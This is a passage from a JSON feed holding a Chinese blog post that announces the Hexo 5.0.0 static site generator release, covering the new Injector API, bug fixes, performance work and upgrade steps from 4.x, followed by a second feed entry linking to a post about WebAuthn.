<code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]